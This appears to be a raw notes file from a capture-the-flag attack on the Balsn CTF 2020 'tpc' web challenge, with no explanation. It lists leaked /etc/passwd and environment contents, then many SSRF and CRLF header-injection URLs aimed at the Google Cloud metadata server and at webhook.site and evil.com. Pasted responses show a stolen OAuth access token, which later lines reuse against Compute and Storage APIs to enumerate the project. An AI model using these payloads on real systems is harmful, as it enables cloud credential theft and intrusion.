@@ -1,0 +1,224 @@
+root:x:0:0:root:/root:/bin/ash
+
+bin:x:1:1:bin:/bin:/sbin/nologin
+
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/bin/sh
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X
+Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+postgres:x:70:70::/var/lib/postgresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+gg:x:1001:1001:Linux User,,,:/home/gg:/bin/sh
+
+# valid login shells /bin/sh /bin/ash
+
+tftp://webhook.site/e0997442-9e53-4f41-bcdd-a88ea95e01e8?a=123:5566/TEST
+sftp://evil.com:5566
+
+/usr/local/bin/python/usr/local/bin/gunicornmain-dc1e2f5f7a4f359bb5ce1317a:app--bind0.0.0.0:8000--workers5--worker-tmp-dir/dev/shm--worker-classgevent--access-logfile---error-logfile-
+
+HOSTNAME=tpc-1
+PYTHON_PIP_VERSION=19.0.3
+SHLVL=1
+HOME=/home/gg
+GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
+PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF-8
+PYTHON_VERSION=3.7.2
+PWD=/opt/workdir
+
+NAME="Alpine Linux" ID=alpine VERSION_ID=3.9.2 
+PRETTY_NAME="Alpine Linux v3.9" HOME_URL="https://alpinelinux.org/" BUG_REPORT_URL="https://bugs.alpinelinux.org/"
+
+
+https://webhook.site/0e1901b0-bc50-40a6-ad1f-a8b6437da7fe/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n
+
+http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&method=get
+
+http://metadata.google.internal/computeMetadata/v1beta1/instance/name?q=HTTP/1.1\r\nMetadata-Flavor: Google\r\nHeader2: \r\n
+
+https://webhook.site/0e1901b0-bc50-40a6-ad1f-a8b6437da7fe/%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo
+
+
+http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20/foo
+
+http://localhost%00%0d%0ax-bar/foo
+
+http://127.0.0.1
+X-injected: header
+/foo
+
+http://127.0.0.1%0D%0AX-injected%3A%20header%0D%0Ax-leftover%3A%20aaa%0D%0A%2Ffoo
+http://127.0.0.1%0D%0AX-injected%3A%20header%0D%0A%2Ffoo
+
+HTTP/1.1
+Header: Value
+http://127.0.0.1/%0D%0AHTTP%2F1.1%0D%0AHeader%3A%20Value
+
+https://webhook.site/0e1901b0-bc50-40a6-ad1f-a8b6437da7fe/?p=%0D%0AHTTP%2F1.1%0D%0AHeader%3A%20Value
+
+http://127.0.0.1?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123:8080/test/?test=a
+https://webhook.site/0e1901b0-bc50-40a6-ad1f-a8b6437da7fe?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123:8080/test/?test=a
+https://webhook.site/0e1901b0-bc50-40a6-ad1f-a8b6437da7fe?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123:8080/test/?test=a
+https://webhook.site/0e1901b0-bc50-40a6-ad1f-a8b6437da7fe?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0ATEST%3A%20123%3A8080/test/?test=a
+
+%20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0ATEST%3A%20123%3A8080
+https://webhook.site/0e1901b0-bc50-40a6-ad1f-a8b6437da7fe?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0A/test/?test=a
+https://webhook.site/0e1901b0-bc50-40a6-ad1f-a8b6437da7fe?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1beta1/instance/name?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1beta1/?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1beta1/instance/name?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/name?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/name?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token&method=get?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+projects/909684563558/zones/asia-east1-b
+http://metadata.google.internal/computeMetadata/v1/instance/name?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+
+http://metadata.google.internal/computeMetadata/?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/disks/?recursive=true %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/project/attributes?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/description?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/disks?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/guest-attributes?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/hostname?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+tpc-1.asia-east1-b.c.balsn-ctf-2020-tpc.internal
+http://metadata.google.internal/computeMetadata/v1/instance/scheduling?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/tags?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+["allow-8000"]
+http://metadata.google.internal/computeMetadata/v1/instance/maintenance-event?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/scheduling/on-host-maintenance?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/scheduling/automatic-restart?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/tags?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/tags?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/tags?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/disks/etc/passwd?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+909684563558
+http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/disks/0/?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+device-name index interface mode type
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+[{"deviceName":"tpc-1","index":0,"interface":"SCSI","mode":"READ_WRITE","type":"PERSISTENT"}]
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+{"gce-container-declaration":
+
+"spec:\n
+ containers:\n
+  - name: tpc-1\n 
+  image: 'asia.gcr.io/balsn-ctf-2020-tpc/tpc:v3.14'
+  \n 
+stdin: false
+\n tty: false
+\n restartPolicy: Always
+\n\n# This container declaration format is not public API and may change without notice. Please\n# use gcloud command-line tool or Google Cloud Console to run Containers on Google Compute Engine.",
+
+"google-logging-enabled":"true"
+}
+http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+{"disable-legacy-endpoints":"TRUE"}
+http://metadata.google.internal/computeMetadata/v1/project/?recursive=true %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+{"attributes":{"disable-legacy-endpoints":"TRUE"},"numericProjectId":909684563558,"projectId":"balsn-ctf-2020-tpc"}
+http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+{"attributes":
+{"gce-container-declaration":"spec:\n containers:\n - name: tpc-1\n image: 'asia.gcr.io/balsn-ctf-2020-tpc/tpc:v3.14'\n stdin: false\n tty: false\n restartPolicy: Always\n\n# This container declaration format is not public API and may change without notice. Please\n# use gcloud command-line tool or Google Cloud Console to run Containers on Google Compute Engine.","google-logging-enabled":"true"},"cpuPlatform":"Intel Broadwell","description":"","disks":[{"deviceName":"tpc-1","index":0,"interface":"SCSI","mode":"READ_WRITE","type":"PERSISTENT"}],"guestAttributes":{},"hostname":"tpc-1.asia-east1-b.c.balsn-ctf-2020-tpc.internal","id":5022317673279747803,"image":"projects/cos-cloud/global/images/cos-stable-85-13310-1041-28","legacyEndpointAccess":{"0.1":6,"v1beta1":1},"licenses":[{"id":"1001010"},{"id":"6880041984096540132"},{"id":"166739712233658766"}],"machineType":"projects/909684563558/machineTypes/e2-medium","maintenanceEvent":"NONE","name":"tpc-1","networkInterfaces":[{"accessConfigs":[{"externalIp":"35.194.175.80","type":"ONE_TO_ONE_NAT"}],"dnsServers":["169.254.169.254"],"forwardedIps":[],"gateway":"10.140.0.1","ip":"10.140.0.8","ipAliases":[],"mac":"42:01:0a:8c:00:08","mtu":1460,"network":"projects/909684563558/networks/default","subnetmask":"255.255.240.0","targetInstanceIps":[]}],"preempted":"FALSE","remainingCpuTime":-1,"scheduling":{"automaticRestart":"TRUE","onHostMaintenance":"MIGRATE","preemptible":"FALSE"},"serviceAccounts":{"909684563558-compute@developer.gserviceaccount.com":{"aliases":["default"],"email":"909684563558-compute@developer.gserviceaccount.com","scopes":["https://www.googleapis.com/auth/devstorage.read_only","https://www.googleapis.com/auth/logging.write","https://www.googleapis.com/auth/monitoring.write","https://www.googleapis.com/auth/servicecontrol","https://www.googleapis.com/auth/service.management.readonly","https://www.googleapis.com/auth/trace.append"]},"default":{"aliases":["default"],"email":"909684563558-compute@developer.gserviceaccount.com","scopes":["https://www.googleapis.com/auth/devstorage.read_only","https://www.googleapis.com/auth/logging.write","https://www.googleapis.com/auth/monitoring.write","https://www.googleapis.com/auth/servicecontrol","https://www.googleapis.com/auth/service.management.readonly","https://www.googleapis.com/auth/trace.append"]}},"tags":["allow-8000"],"virtualClock":{"driftToken":"0"},"zone":"projects/909684563558/zones/asia-east1-b"}
+
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+
+{"access_token":"ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg","expires_in":3196,"token_type":"Bearer"}
+
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+
+https://www.googleapis.com/compute/v1/projects/{}/zones/{}/instances/{}
+
+https://compute.googleapis.com/compute/v1/projects/balsn-ctf-2020-tpc
+https://compute.googleapis.com/compute/v1/projects/balsn-ctf-2020-tpc?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+
+https://www.googleapis.com/compute/v1/projects/balsn-ctf-2020-tpc/zones/asia-east1-b/instances/tpc-1?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0ATEST%3A%20123%3A8080/test/?test=a
+https://www.googleapis.com/compute/v1/projects/balsn-ctf-2020-tpc/zones/asia-east1-b/instances/tpc-1?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/project/project-id?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+balsn-ctf-2020-tpc
+http://metadata.google.internal/computeMetadata/v1/instance/name?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/zone?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+projects/909684563558/zones/asia-east1-b
+https://www.googleapis.com/compute/v1/projects/balsn-ctf-2020-tpc/zones/asia-east1-b/instances/tpc-1?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+https://www.googleapis.com/compute/v1/projects/909684563558/zones/asia-east1-b/instances/tpc-1?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+GET https://compute.googleapis.com/compute/v1/projects/[PROJECT_ID]/zones/[ZONE]/instances/[INSTANCE_NAME]
+https://compute.googleapis.com/compute/v1/projects/909684563558/zones/asia-east1-b/instances/tpc-1?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+https://compute.googleapis.com/compute/v1/projects/909684563558/zones/asia-east1-b/instances/tpc-1?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+https://www.googleapis.com/storage/v1/b?project=balsn-ctf-2020-tpc %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+{ "kind": "storage#buckets", "items":
+ [ { "kind": "storage#bucket", "selfLink":
+  "https://www.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com", 
+  "id": "asia.artifacts.balsn-ctf-2020-tpc.appspot.com", 
+  "name": "asia.artifacts.balsn-ctf-2020-tpc.appspot.com", "
+  projectNumber": "909684563558", "metageneration": "1", "locat
+  ion": "ASIA", "storageClass": "STANDARD", "etag": "CAE=", "timeC
+  reated": "2020-10-03T05:12:42.035Z", "updated": "2020-10-03T05:1
+  2:42.035Z", "iamConfiguration": { "bucketPolicyOnly": { "enabled
+  ": false }, "uniformBucketLevelAccess": { "enabled": false } }, 
+  "locationType": "multi-region" } ] }
+https://www.googleapis.com/storage/v1/b?project=<your_project_id>
+
+http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys?alt=json %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys?alt=json %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env?alt=json %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+https://compute.googleapis.com/compute/v1/projects/909684563558?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
+https://compute.googleapis.com/compute/v1/projects/balsn-ctf-2020-tpc?a=1 %20HTTP%2F1.1%0D%0AX-injected%3A%20header%0D%0AMetadata-Flavor%3A%20Google%0D%0AAuthorization%3A%20Bearer%20ya29.c.KpcB5QeAWKnJ6ktl4TAUOF0Y0cilrwOAnQs3UaEKaiesAVpGcS9E_kJ3R09BoxCTjRWI1-P-IFkQf254elS6c4oXND-NIUdfQETJlhgjIeX4SFaqsOxMpwuXuS1ldp4GFfIthsSZzoUeOIx_DZ49LQsfUFGajGFEXmJ_rBzgnRz0Rd62YVo8fsaRGZV7aClDPpA6bGR21hdLvg%0D%0ATEST%3A%20123%3A8080/test/?test=a
